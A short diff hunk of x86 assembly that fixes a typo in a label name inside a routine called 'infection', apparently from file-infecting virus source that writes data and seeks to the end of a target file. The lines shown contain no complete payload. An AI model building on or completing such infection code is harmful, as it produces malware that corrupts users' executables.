@@ -97,7 +97,7 @@ infection:
 		sub ebx, 60
 		write [ebp-4], ebx, 52
         
-writePrevioudEntry:	
+writePreviousEntry:	
 		lseek [ebp-4], -4, SEEK_END
 		mov ebx, ebp
 		sub ebx, 64
